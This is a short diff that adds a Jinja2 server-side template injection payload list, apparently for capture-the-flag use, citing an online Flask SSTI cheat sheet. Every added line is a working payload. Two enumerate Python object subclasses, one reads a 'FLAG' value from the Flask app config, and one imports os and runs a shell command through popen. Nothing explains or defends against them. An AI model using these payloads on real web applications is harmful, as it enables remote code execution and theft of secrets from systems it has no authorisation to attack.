@@ -1,0 +1,6 @@
+#Jinja (https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
+
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
+{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
